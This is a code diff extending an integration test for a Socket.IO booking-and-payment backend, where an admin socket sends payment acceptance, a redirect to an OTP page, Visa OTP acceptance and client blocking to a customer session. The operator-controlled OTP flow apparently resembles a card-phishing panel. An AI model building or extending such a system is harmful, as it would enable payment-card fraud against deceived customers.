@@ -1,7 +1,7 @@
 #!/usr/bin/env node
 /**
- * Integration test: submits a sample booking + payment payload over Socket.IO
- * and asserts every expected field is flattened onto the /users row.
+ * Integration test: submits sample data, verifies field flattening, then uses a
+ * second admin socket to verify dashboard actions reach the customer contract.
  *
  * Usage:
  *   node scripts/integration-test.mjs [baseUrl]
@@ -77,6 +77,9 @@ console.log(`backend ${BASE} version=${version.version} persistent=${version.per
 const socket = io(BASE, { transports: ["websocket"], extraHeaders: { Origin: ORIGIN } });
 const events = [];
 for (const e of ["live:update", "form:submitted"]) socket.on(e, () => events.push(e));
+const relayed = [];
+for (const e of ["payment:action", "admin:redirect", "user:blocked", "otp:action"])
+  socket.on(e, (payload) => relayed.push({ event: e, payload }));
 
 const uuid = await new Promise((resolve, reject) => {
   const t = setTimeout(() => reject(new Error("timed out waiting for user:uuidAssigned")), 20000);
@@ -102,7 +105,6 @@ if (!res.ok) fail(`GET /users -> ${res.status}`);
 const body = await res.json();
 const rows = Array.isArray(body) ? body : body.users || [];
 const row = rows.find((u) => (u.uuid || u.id) === uuid);
-socket.close();
 if (!row) fail(`no /users row found for uuid ${uuid}`);
 
 const missing = [];
@@ -115,3 +117,50 @@ console.log(`realtime events observed: ${[...new Set(events)].join(", ") || "non
 
 if (missing.length) fail(`${missing.length} field(s) not flattened: ${missing.join(", ")}`);
 console.log(`\n✓ all ${Object.keys(expected).length} fields flattened onto the /users row`);
+
+const admin = io(BASE, {
+  transports: ["websocket"],
+  auth: ADMIN_TOKEN ? { adminToken: ADMIN_TOKEN } : {},
+  extraHeaders: { Origin: ORIGIN },
+});
+await new Promise((resolve, reject) => {
+  const timer = setTimeout(() => reject(new Error("admin socket connection timed out")), 20000);
+  admin.once("connect", () => {
+    clearTimeout(timer);
+    admin.emit("join", { role: "admin", ...(ADMIN_TOKEN ? { adminToken: ADMIN_TOKEN } : {}) });
+    resolve();
+  });
+  admin.once("connect_error", reject);
+}).catch((e) => fail(e.message));
+
+for (const [event, payload] of [
+  ["acceptPaymentForm", { id: uuid }],
+  ["adminRedirect", { uuid, page: "/otp", pageName: "OTP" }],
+  ["acceptVisaOtp", { targetUserId: uuid }],
+  ["clientBlocked", { userId: uuid, message: "blocked" }],
+]) {
+  await new Promise((resolve) =>
+    admin.timeout(5000).emit(event, payload, (error, response) => {
+      if (error || !response?.ok) fail(`${event} was not acknowledged`);
+      resolve();
+    }),
+  );
+}
+await sleep(1000);
+
+const expectedRelay = {
+  "payment:action": "confirmed",
+  "admin:redirect": null,
+  "user:blocked": null,
+  "otp:action": "confirmed",
+};
+for (const [event, action] of Object.entries(expectedRelay)) {
+  const matches = relayed.filter(
+    (entry) => entry.event === event && (!action || entry.payload?.action === action),
+  );
+  if (matches.length !== 1) fail(`${event} relay count=${matches.length}, expected 1`);
+  console.log(`✓ ${event} relayed once to customer`);
+}
+
+admin.close();
+socket.close();
